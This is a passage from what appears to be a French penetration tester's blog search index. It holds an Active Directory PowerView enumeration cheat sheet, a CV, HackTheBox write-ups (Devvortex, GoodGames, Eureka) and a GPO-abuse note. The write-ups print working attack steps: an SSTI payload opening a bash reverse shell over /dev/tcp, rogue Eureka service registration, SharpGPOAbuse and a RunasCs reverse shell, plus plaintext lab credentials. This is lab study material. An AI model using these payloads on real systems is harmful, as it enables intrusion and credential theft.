\u0026#34;*admin*\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres--domain-admins-\"\u003e👑 Membres « Domain Admins »\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Domain Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-4-machines--serveurs\"\u003e🖥️ 4. Machines \u0026amp; Serveurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-ordinateurs\"\u003e📜 Liste des ordinateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-spécifique-ex-server-2022\"\u003e🔍 Recherche spécifique (ex. Server 2022)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-OperatingSystem\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*Server 2022*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-test-de-connectivité\"\u003e📡 Test de connectivité\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"n\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nb\"\u003eTest-Connection\u003c/span\u003e \u003cspan class=\"n\"\u003e-Count\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-localisation-des-sessions-dun-utilisateur\"\u003e👁️ Localisation des sessions d’un utilisateur\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-DomainUserLocation\u003c/span\u003e \u003cspan class=\"n\"\u003e-UserGroupIdentity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;RDPUsers\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-5-acl-et-permissions\"\u003e🔐 5. ACL et Permissions\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-les-acl-dun-objet\"\u003e🔍 Obtenir les ACL d’un objet\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainObjectAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-SamAccountName\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-ace-intéressants\"\u003e🧠 Rechercher des ACE intéressants\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-InterestingDomainAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-acl-sur-un-chemin-spécifique\"\u003e📂 ACL sur un chemin spécifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-PathAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-Path\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-6-autres-techniques\"\u003e📂 6. Autres Techniques\u003c/h2\u003e\n\u003ch3 id=\"-découverte-de-serveurs-de-fichiers\"\u003e📂 Découverte de serveurs de fichiers\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetFileServer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-ressources-utiles\"\u003e📚 Ressources utiles\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://powersploit.readthedocs.io/en/latest/Recon/\"\u003ePowerView Documentation (PowerSploit)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/powershell/module/activedirectory/\"\u003eCmdlets Active Directory Microsoft\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Reconnaissance Active Directory avec PowerView"},{"content":" Michel NYOBE | Pentester \u0026amp; Cloud Security Enthusiast\n📍 Paris, France | 📧 michelnyobe87@gmail.com | 🔐\nProfil Passionné par la cybersécurité offensive, le je me spécialise dans les attaques Active Directory, le pentesting d’environnements cloud (Azure \u0026amp; AWS), et la sécurité des identités. En formation continue et à la recherche d’un poste/apprentissage en Red Team ou pentest.\nLabs et Environnements Active Directory Lab (6 VM) automatisé sur Azure Plateformes : TryHackMe\nHackTheBox\nRoot-Me\nDéfis réguliers : Pro Labs Dante HTB Zephyr HTB https://www.root-me.org/vladimirlarass\n--- ## Formations \u0026 Certifications CRTP (A jour) — Certified Red Team Professional CRTE (A jour) — Certified Red Team Expert CARTP (En cours) — Certified Azure Red Team Professional CPTS - HTB (en cours) — Certified Penetration Testing Specialist ** OSCP ( En cours) AZ-900 (A jour) — Azure Fundamentals AZ-500 (A jour) — Azure Security Engineer SC-900 (A jour) — Security, Compliance, and Identity Fundamentals CNSP ( A jour ) — Certified Network Security Practitioner Security+ (CompTIA) : Concepts fondamentaux de la sécurité SI, gestion des incidents, sécurité réseau et organisationnelle HTB ProLabs : DANTE, Zephyr Expériences 🛡️ Développeur Logiciels de Sécurité – ENIX (07/2023 – 01/2024) Développement de scripts (Next.js, GraphQL) Administration d’Active Directory, Wazuh, PowerShell 🔐 DevSecOps – TDR Consulting (05/2022 – 07/2023) Sécurisation des chaînes CI/CD : Docker, Kubernetes, Jenkins Projets : Uptiimum.tech, IFPCE Africa 🧠 Ingénieur Sécurité (Stage) – Backbone Corp (08/2021 – 10/2021) Configuration de serveurs, sauvegarde (Zabbix, Bacula) Python, documentation technique 💻 Technicien Support Informatique (Stage) – ENEO (07/2019 – 10/2019) Administration réseau (Cisco), Active Directory Virtualisation : VMware, Proxmox 🛡️ Compétences Techniques en Cybersécurité 🔍 Tests d’Intrusion Active Directory Les tests d’intrusion AD simulent des attaques ciblant des environnements Windows d’entreprise.\n🏁 Reconnaissance Active Directory Enumération Active Directory Enumération LDAP : ldapsearch, ADFind, SharpHound Cartographie des relations d’accès avec BloodHound (Neo4j) Enumération DNS interne : nslookup, dig, dnscmd Enumération des partages et services : smbclient, smbmap, rpcclient, CrackMapExec 🔐 Techniques d’authentification AS-REP Roasting : utilisateurs avec DONT_REQ_PREAUTH Kerberoasting : extraction de tickets TGS Pass-the-Hash : utilisation de hash NTLM pour l’authentification Pass-the-Ticket : réutilisation de tickets Kerberos Overpass-the-Hash / Pass-the-Key : création de TGT NTLM Relay : ntlmrelayx, mitm6 🧬 Exploitation des délégations Délégation non contrainte : extraction TGT depuis les services Délégation contrainte (S4U2Self / S4U2Proxy) : abus via Rubeus RBCD (Resource-Based Constrained Delegation) : Powermad, Rubeus 🛠️ Vulnérabilités spécifiques Zerologon (CVE-2020-1472) : élévation via Netlogon PetitPotam : coercion NTLM via MS-EFSRPC PrintNightmare (CVE-2021-34527) : RCE via spouleur Shadow Credentials : ajout de clé dans AD LAPS et GPP Passwords : extraction dans SYSVOL 🧑‍💻 Mouvement latéral \u0026amp; persistance DCSync, DCShadow Golden Ticket, Silver Ticket Skeleton Key, SIDHistory abuse , - SID : Identificateurs de sécurité Credential Dumping : Mimikatz, LaZagne, Rubeus, SharpDPAPI 💥 Exploitation de Vulnérabilités 🔎 Scanning \u0026amp; Enumeration Nmap, Nessus, OpenVAS, Nikto, LinPEAS, WinPEAS Recherche de failles : searchsploit, exploit-db, CVE.sh, VulnHub ⚙️ Techniques Buffer Overflow, SEH, DEP/ASLR bypass Injections : SQLi, Commande, XXE, XSS, LFI/RFI Escalade locale : kernel exploits, SUID abuse, ACL Reverse Engineering : Ghidra, strings, radare2 📡 Outils Metasploit, Impacket, Responder, CrackMapExec, Evil-WinRM Post-exploitation : Chisel, Ligolo, Pupy, PowerView, Empire 🌐 Attaques Web 🔍 Reconnaissance Fuzzing \u0026amp; découverte : FFUF, Gobuster, Dirsearch Interception \u0026amp; Analyse : Burp Suite, ZAP, Postman Analyse JS, robots.txt, cookies, headers HTTP 💉 Vulnérabilités Web SQLi, XSS (Reflected, Stored, DOM) Command Injection, SSRF, XXE File Inclusion (LFI/RFI) File Upload bypass (extension, MIME) CSRF, Broken Access Control (IDOR, path traversal) Auth bypass, Brute force, JWT cracking 🧪 Post-exploitation Reverse shells en PHP, Python, Bash Webshells : C99, WSO, China Chopper SSRF vers metadata AWS, Pivoting via intranet 🔧 Outils Web Burp Suite, SQLmap, WFuzz, XSStrike, Commix, JWT Tool 🔐 Cloud Security ☁️ Microsoft Azure \u0026amp; Azure AD IAM \u0026amp; Sécurité : RBAC, PIM, Conditional Access, Identity Protection Microsoft Defender (Cloud, Endpoint) : Posture de sécurité, alertes, intégration Sentinel Microsoft Sentinel (SIEM) : KQL, alertes, playbooks, détection MITRE Outils : Az, AzureHound, Stormspotter, ROADtools, AADInternals ☁️ AWS Security IAM (Roles, Policies, MFA, SCP) Logging \u0026amp; audit : CloudTrail, Config, CloudWatch Détection \u0026amp; alertes : GuardDuty, Security Hub, Macie Outils Red Team : Pacu, enumerate-iam, cloudsplaining, ScoutSuite 📊 SIEM Splunk : SPL, détection de comportements, dashboards QRadar : corrélation, offenses, log sources Wazuh : HIDS, ELK, intégration Sysmon 📌 Cas pratiques Détection brute force, exfiltration DNS Analyse de logs AD, GPO, accès privilégiés Threat Hunting MITRE ATT\u0026amp;CK ⚙️ SOAR Cortex XSOAR : Playbooks automatisés : enrichissement IOC, blocage IP Intégration avec EDR, SIEM, antivirus, email Cas d’usage : phishing, quarantaine automatique, sandbox analyse 🧪 Analyse de Logs \u0026amp; Réponse à Incident Journaux : Syslog, Event Viewer, Apache/Nginx, Firewall, AV/EDR Techniques de Threat Hunting (MITRE, hypothesis-based) Outils : YARA, Sigma, Sysmon, KAPE, Velociraptor 📈 Vulnerability Management Outils : Nessus, OpenVAS, CVE.sh Processus : Scans récurrents, CVSS scoring Patch management, hardening, benchmark CIS/STIG Reporting : priorisation, KPI, plans de remédiation 🧰 Outils Techniques Offensive Burp Suite, Nmap, Metasploit, Wireshark Impacket, CrackMapExec, BloodHound Responder, Rubeus, PowerView, Mimikatz Tools Web : SQLmap, FFUF, Dirsearch, ZAP Reverse \u0026amp; Post-exploitation Ghidra, strings, radare2, Powershell Empire, Covenant 🤖 Automatisation \u0026amp; Scripting Bash : durcissement Linux, audits, automatisation PowerShell : scripts d’audit AD, post-exploitation Windows Python : scrapers, outils offensifs, parsing, APIs Frameworks : Requests, Paramiko, Nmap, Shodan, Flask, PyInstaller 🚀 CI/CD \u0026amp; DevSecOps GitHub Actions, Azure DevOps : CI/CD, linters, scan SAST Docker : images sécurisées, vulnérabilité scan (Trivy, Snyk) Kubernetes (base) : RBAC, secrets, pods, monitoring Intégration des outils de sécurité dans les pipelines (DevSecOps) 💻 Langages de Programmation Python : outils de pentest, détection de vulnérabilités PHP : développement Web (Laravel), injections C / C++ : exploitation mémoire, reverse engineering JavaScript : développement web ","permalink":"https://nyobemichel.me/about/","summary":"\u003cdiv style=\"font-size: 13px;\"\u003e\n\u003cp\u003e\u003cstrong\u003eMichel NYOBE\u003c/strong\u003e | Pentester \u0026amp; Cloud Security Enthusiast\u003cbr\u003e\n📍 Paris, France | 📧 \u003ca href=\"mailto:michelnyobe87@gmail.com\"\u003emichelnyobe87@gmail.com\u003c/a\u003e | 🔐\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"profil\"\u003eProfil\u003c/h2\u003e\n\u003cp\u003ePassionné par la \u003cstrong\u003ecybersécurité offensive\u003c/strong\u003e, le je me spécialise dans les attaques \u003cstrong\u003eActive Directory\u003c/strong\u003e, le pentesting d’environnements cloud (Azure \u0026amp; AWS), et la sécurité des identités. En formation continue et à la recherche d’un poste/apprentissage en Red Team ou pentest.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"labs-et-environnements\"\u003eLabs et Environnements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eActive Directory Lab (6 VM) automatisé sur Azure\u003c/li\u003e\n\u003cli\u003ePlateformes :\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eTryHackMe\u003c/p\u003e","title":"Whoami /All"},{"content":"Enumeration Nmap Nous avons débuté l\u0026rsquo;engagement par une analyse de port à l\u0026rsquo;aide de l\u0026rsquo;outil Nmap afin d\u0026rsquo;identifier les services exposés sur la cible.\nnmap -sV -sC 10.10.11.242 -v --min-rate 1000 -Pn -T4 -p- Les résultats du scan Nmap indiquent que seuls les ports 22 (SSH) et 80 (HTTP) sont ouverts sur la cible.\nLors de l\u0026rsquo;analyse, nous avons identifié le domaine devvortex.htb, qu’il a été nécessaire d’ajouter manuellement au fichier hosts local afin d’en permettre la résolution DNS.\nSuite à l’énumération des sous-domaines et des répertoires à l’aide de l’outil ffuf , nous avons découvert un sous-domaine supplémentaire : dev.devvortex.htb.\nL’énumération des domaines associés à dev.devvortex.htb nous a permis d’identifier une interface d’administration accessible via dev.devvortex.htb/administrator, sur laquelle nous avons constaté la présence d’un template Joomla.\nAprès avoir identifié l’utilisation du CMS Joomla, nous avons analysé les fichiers accessibles publiquement et inspecté le code source de la page d’administration. Cette investigation nous a permis de retrouver un fichier joomla.xml, situé dans /administrator/manifests/files/, contenant les métadonnées du CMS, notamment sa version exacte. Une vérification croisée via des recherches en ligne a confirmé la version identifiée.\nNous avons ensuite effectué des recherches en ligne concernant la version identifiée de Joomla et avons découvert qu’elle est affectée par une vulnérabilité connue et nous l\u0026rsquo;avions exploite\nruby exploit.rb http://dev.devvortex.htb user : lewis password: P4ntherg0t1n5r3c0n##\nServer-Side Template injection Après avoir accédé à l’interface d’administration Joomla, nous avons exploité une vulnérabilité de type Server-Side Template Injection (SSTI) présente dans le gestionnaire de templates. Cette faille nous a permis d’injecter du code côté serveur et d’obtenir une exécution de commandes arbitraires sur la machine cible.\nAprès l’exploitation initiale, nous avons poursuivi avec une phase d’énumération des services internes disponibles sur le réseau. Cette analyse nous a permis d’identifier un service MySQL en cours d’exécution. En nous connectant à ce service, nous avons pu énumérer les bases de données ainsi que leurs tables. Cette exploration nous a permis de récupérer des informations sensibles, notamment les identifiants associés à l’utilisateur \u0026rsquo;logan'.\nnc -lvnp 443 $ ss -tlpn $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u\nlogan tequieromucho\nGrâce à l\u0026rsquo;identification du hash bcrypt associé à l\u0026rsquo;utilisateur \u0026rsquo;logan\u0026rsquo;, nous avons réussi à retrouver le mot de passe en clair par attaque par dictionnaire. Cela nous a permis de nous connecter avec succès en ssh .\nhashcat -m 3200 lol.txt /home/kali/Documents/TryHackme/Wordlist/rockyou.txt Elevation de privilege Dans le cadre de l’élévation de privilèges, nous avons analysé l’environnement du système compromis à la recherche de vulnérabilités locales. Cette analyse nous a permis d’identifier une faille de sécurité connue, référencée sous un identifiant CVE-2023-1326, exploitable sur le système. En tirant parti de cette vulnérabilité, nous avons obtenu un accès privilégié (root) à la machine\nReferences https://github.com/Acceis/exploit-CVE-2023-23752 https://github.com/diego-tella/CVE-2023-1326-PoC https://x.com/7h3h4ckv157/status/1728753489839628604 https://www.revshells.com/ https://academy.hackthebox.com/module/details/145\n","permalink":"https://nyobemichel.me/posts/devvortex/","summary":"Difficulte : esay","title":"Devvortex -HTB"},{"content":"Enumeration Nmap Nous débutons notre phase de reconnaissance par un scan Nmap de la cible.\n80/tcp open http Werkzeug httpd 2.0.2 (Python 3.9.2) |_http-title: GoodGames | Community and Store | http-methods: |_ Supported Methods: GET HEAD OPTIONS POST |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB L’analyse révèle que seul le port 80 est ouvert et qu’il héberge un serveur HTTP Python via Werkzeug 2.0.2.\nServeur Web Python En accédant au site via le port 80, nous tombons sur une interface web : http://goodgames.htb/\nAjout de l’entrée DNS au fichier hosts :\nsudo echo \u0026#34;10.10.11.130 goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts En inspectant la fonctionnalité de connexion, une tentative d\u0026rsquo;injection SQL est envisagée. Toutefois, l\u0026rsquo;application impose la saisie d’une adresse e-mail valide.\nNous utilisons alors une adresse valide, puis interceptons la requête dans Burp Suite pour modifier l’e-mail en admin@goodgames.htb. Une fois soumise, un message de bienvenue s’affiche, indiquant une possible compromission du compte administrateur.\nInjection SQL Après confirmation d\u0026rsquo;une vulnérabilité SQLi, nous enregistrons la requête HTTP dans un fichier nommé goodgames.req afin de l\u0026rsquo;exploiter avec sqlmap.\nsqlmap -r goodgames.req --dbs Sqlmap révèle deux bases de données :\ninformation_schema\nmain\nNous listons ensuite les tables de la base main :\nsqlmap -r goodgames.req -D main --tables Et enfin, nous extrayons les données de la table user :\nsqlmap -r goodgames.req -D main -T user --dump Résultat :\nadmin@goodgames.htb : superadministrator Portail Interne d\u0026rsquo;Administration En haut à droite du tableau de bord, une icône d’engrenage mène à une URL interne :\nhttp://internal-administration.goodgames.htb/login\nAjout de l’entrée dans le fichier hosts :\nsudo echo \u0026#34;10.10.11.130 internal-administration.goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Nous utilisons les identifiants extraits (admin / superadministrator) pour accéder à l’interface d\u0026rsquo;administration. Cela nous donne accès au dashboard.\nSSTI (Server-Side Template Injection) Nous suspectons une vulnérabilité SSTI. Une charge utile de test est injectée :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;id\u0026#39;).read() }} La commande est exécutée, confirmant la vulnérabilité. Nous exploitons cela pour obtenir un reverse shell :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;).read() }} Escalade de Privilèges Énumération L’environnement montre plusieurs signes d’une exécution dans un conteneur Docker. On y observe également des fichiers liés à un utilisateur inconnu (UID 1000) inexistant dans /etc/passwd.\nUne adresse IP privée suggère une architecture en réseau Docker. Nous réalisons un scan ping :\nfor i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done Et un scan des ports :\nfor port in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$port \u0026amp;\u0026amp; echo \u0026#34;$port open\u0026#34;; done 2\u0026gt;/dev/null Le processus docker est actif sur le système.\nL\u0026rsquo;utilisateur augustus, présent sur le système, dispose d’un répertoire utilisateur contenant des fichiers identiques à ceux du conteneur.\nÉvasion de Conteneur \u0026amp; Accès Root Nous copions /bin/bash dans le répertoire d’augustus :\nPuis exécutons le binaire avec l’option -p pour préserver les privilèges root :\n./bash -p Cela nous accorde un shell avec les droits root hors du conteneur.\n","permalink":"https://nyobemichel.me/posts/goodgame/","summary":"Difficulte : esay","title":"GoodGame-HTB"},{"content":"Enumeration Nmap Enumeration Nmap Nous commençons par exécuter une analyse nmap sur la cible :\nLe scan révèle que les ports 22, 80 et 8761 sont ouverts sur la cible.\nEn explorant le port 80, nous avons découvert un site web accessible à l\u0026rsquo;adresse furni.htb.\nAfin d’identifier d’éventuelles ressources non listées accessibles sur le serveur web de la cible http://furni.htb, un fuzzing de répertoires a été réalisé à l’aide de l’outil ffuf.\nffuf -u http://furni.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt Cela m\u0026rsquo;a permis d’identifier plusieurs sous-domaines associés à la cible. Ces sous-domaines peuvent héberger des fichiers, dossiers ou applications supplémentaires potentiellement intéressants à la suite de l’analyse.\nAprès avoir téléchargé l\u0026rsquo;ensemble des fichiers disponibles et entamé leur analyse un par un, j\u0026rsquo;ai identifié un fichier nommé headpdump. En examinant son contenu, j\u0026rsquo;ai recherché la présence éventuelle d\u0026rsquo;informations sensibles telles que des identifiants ou des mots de passe. Cette inspection m’a permis de mettre en évidence des données potentiellement intéressantes.\npassword=0sc@r190_S0l!dP@sswd, user=oscar190\nhttp://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!\nOscar parvient à se connecter via SSH, mais j\u0026rsquo;ai également repéré le service Eureka. Afin d\u0026rsquo;y accéder, je vais configurer une redirection de port pour pouvoir me connecter au port 8761.\nssh -L 8761:localhost:8761 oscar190@10.10.11.66 Les identifiants récupérés seront testés sur l’ensemble des interfaces de connexion identifiées précédemment. login: EurekaSrvr password: 0scarPWDisTheB3st\nNous allons déployer un service factice basé sur l’exemple \u0026ldquo;Hacking Netflix Eureka\u0026rdquo;, dans le but de simuler une présence légitime au sein de l’environnement et d’exploiter la confiance accordée aux services enregistrés.\ncurl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{ \u0026#34;instance\u0026#34;: { \u0026#34;instanceId\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;hostName\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;app\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;ipAddr\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;vipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;secureVipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;UP\u0026#34;, \u0026#34;port\u0026#34;: { \u0026#34;$\u0026#34;: 8081, \u0026#34;@enabled\u0026#34;: \u0026#34;true\u0026#34; }, \u0026#34;dataCenterInfo\u0026#34;: { \u0026#34;@class\u0026#34;: \u0026#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MyOwn\u0026#34; } } }\u0026#39; Nous avons réussi à extraire le nom d\u0026rsquo;utilisateur et le mot de passe associés au service ciblé, ce qui permet une élévation des privilèges ou un accès non autorisé aux ressources internes.\nusername=miranda.wise%40furni.htb\u0026amp;password=IL%21veT0Be%26BeT0L0ve\u0026amp;_csrf=JIVbCzoWJkTBdEsVTbZrxfWiTajQj9Lg9FvXWFIcckIGJ5AuQOM_aFknH3DsRigsLJtf88DBYMm1vefNwG7vYGd-SyA1QqhP ! password : IL!veT0Be\u0026amp;BeT0L0ve\nCyberChef - GCHQ\nHacking Netflix Eureka - Backbase\n","permalink":"https://nyobemichel.me/posts/eureka/","summary":"Difficulte : esay","title":"Eureka-HTB"},{"content":"Bienvenue dans mon premier article Hugo ! 🎉\nPourquoi utiliser Hugo ? 💨 Rapide 📄 Basé sur Markdown 🎨 Personnalisable avec des thèmes comme PaperMod Ce que tu peux faire Ajouter des images Créer des liens internes Générer un site statique complet Exemple de code hugo new posts/mon-article.md ","permalink":"https://nyobemichel.me/posts/example/","summary":"Ceci est un exemple de post pour tester Hugo avec le thème PaperMod.","title":"Bienvenue sur mon premier article"},{"content":"SharpGPOAbuse.exe\n1. commande PowerShell utilisée pour créer un nouvel objet de stratégie de group New-GPO -Name \u0026#34;pwnedGPO 2.creer un nouveau GPO nommé evil et lié à l\u0026rsquo;unité d\u0026rsquo;organisation des contrôleurs de domaine. New-GPO -Name PwnedGPO | New-GPLink -Target \u0026#34;OU=DOMAIN CONTROLLERS,D C=FRIZZ,DC=HTB\u0026#34; -LinkEnabled Yes 3. Modifier l\u0026rsquo;objet de stratégie de groupe pour ajouter un administrateur local .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount \u0026lt;Users\u0026gt;--GPO Name PwnedGPO 4.Force GPO Update gpupdate /force 5.Spawn Administrative Shell RunasCs.exe pour lancer un shell cmd.exe avec les identifiants\n\\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r Your-machine-ip: 4444 https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more\n","permalink":"https://nyobemichel.me/posts/activedirectory/abuse-gpo/","summary":"\u003cp\u003eSharpGPOAbuse.exe\u003c/p\u003e\n\u003ch3 id=\"1-commande-powershell-utilisée-pour-créer-un-nouvel-objet-de-stratégie-de-group\"\u003e1. commande PowerShell utilisée pour créer un nouvel objet de stratégie de group\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eNew-GPO -Name \u0026#34;pwnedGPO\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"2creer-un-nouveau-gpo-nommé-evil-et--lié-à-lunité-dorganisation-des-contrôleurs-de-domaine\"\u003e2.creer un nouveau GPO nommé evil et  lié à l\u0026rsquo;unité d\u0026rsquo;organisation des contrôleurs de domaine.\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eNew-GPO -Name PwnedGPO | New-GPLink -Target \u0026#34;OU=DOMAIN CONTROLLERS,D\nC=FRIZZ,DC=HTB\u0026#34; -LinkEnabled Yes\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"3-modifier-lobjet-de-stratégie-de-groupe-pour-ajouter-un-administrateur-local\"\u003e3. Modifier l\u0026rsquo;objet de stratégie de groupe pour ajouter un administrateur local\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount \u0026lt;Users\u0026gt;--GPO\nName 